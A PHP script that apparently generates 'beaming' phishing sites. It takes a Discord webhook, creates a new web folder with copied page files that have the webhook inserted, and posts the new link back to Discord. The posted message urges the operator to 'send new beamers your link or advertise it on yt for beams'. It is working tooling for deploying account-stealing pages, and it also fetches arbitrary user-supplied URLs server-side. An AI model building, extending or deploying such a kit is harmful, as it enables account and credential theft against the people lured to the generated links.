<?php
$dir = $_GET['dir'];
$web = $_GET['web'];

if (preg_match('/[^A-Za-z0-9]/', $dir)){
$error = "Directory can only contain letters and numbers!"; 
}

$curl = curl_init();
curl_setopt($curl, CURLOPT_URL, $web); 
curl_setopt($curl, CURLOPT_RETURNTRANSFER, true); 
curl_setopt($curl, CURLOPT_HTTPGET, true);
$req = curl_exec($curl);
$jd = json_decode($req, true);
$err = $jd['guild_id'];



if ($err == "") {
$error = "Invalid Webhook";
}

if ($error == "")
{
if (!file_exists("../../$dir")) { 
mkdir("../../$dir");
$index = file_get_contents("indexr.php");
$refresh = file_get_contents("refresh.php");
$refresh = str_replace("{web}", $web, $refresh);

$path = "../../$dir/"; 
$fo = fopen($path."index.php", 'w'); 
$fo2 = fopen($path."refresh.php", 'w');
if ($fo) {
    fwrite($fo, $index); 
    fwrite($fo2, $refresh); 
    
$dom = $_SERVER['SERVER_NAME'];

$timestamp = date("c", strtotime("now"));
$json_data = json_encode([
    // Message
    "content" => "@here send new beamers your link or advertise it on yt for beams",
    // Username
    "username" => "CAL",
    // Avatar URL.
    // Uncomment to replace image set in webhook
    "avatar_url" => "https://cdn.discordapp.com/icons/1050572542634639420/2abb6780ef2c57ff0302b4d1292218ac.webp?size=2048",
    // Text-to-speech
    "tts" => false,
    // File upload
    // "file" => "",
    // Embeds Array
    "embeds" => [
        [
            // Embed Title
            "title" => "CAL - Gen Result" ,
            "type" => "rich",
            "description" => "",
            "timestamp" => $timestamp,
            "color" => hexdec("000000"),
            "footer" => [
                "text" => "controler and dualhook gen soon",
            ],
            "fields" => [
                
                [
                    "name" => "Link:",
                    "value" => "https://$dom/$dir",
                    "inline" => true
                ]  
            ]
        ]
    ]
], JSON_UNESCAPED_SLASHES | JSON_UNESCAPED_UNICODE);

$ch = curl_init($web);
curl_setopt($ch, CURLOPT_HTTPHEADER, array('Content-type: application/json'));
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, $json_data);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
$response = curl_exec($ch);

curl_close($ch);
}
}else {
echo "Directory Taken";
}
}else {
echo $error;
}